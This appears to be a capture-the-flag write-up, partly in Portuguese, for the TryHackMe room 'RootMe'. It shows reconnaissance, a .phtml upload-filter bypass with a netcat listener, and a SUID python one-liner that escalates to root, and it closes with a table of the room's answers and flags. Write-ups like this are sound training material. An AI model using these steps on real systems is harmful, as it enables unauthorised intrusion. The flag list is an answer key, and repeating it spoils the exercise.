# root-me — TryHackMe

```text
[ TARGET ] 10.67.146.47
[ ROOM   ] RootMe
[ GOAL   ] user.txt / root.txt
[ STATUS ] DONE
```

## 01 — Recon (nmap)

```console
$ nmap -sV 10.67.146.47
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

→ Achado: 2 portas (SSH + HTTP). Room Q: hidden dir `/panel/`.

## 02 — Upload bypass (.phtml)

```console
$ # /panel → upload; .php bloqueado → bypass .phtml
$ # trigger via /uploads/…
$ nc -n -l -p 1234
```

```console
$ find / -type f -name user.txt 2>/dev/null
$ cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
```

## 03 — Privesc (SUID python)

```console
$ find / -user root -perm -4000 2>/dev/null
/usr/bin/python   # (weird)

$ /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
$ cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```

## FLAGS / RESPOSTAS

| Item | Valor |
|---|---|
| open ports | `2` |
| hidden dir | `/panel/` |
| weird SUID | `/usr/bin/python` |
| user.txt | `THM{y0u_g0t_a_sh3ll}` |
| root.txt | `THM{pr1v1l3g3_3sc4l4t10n}` |
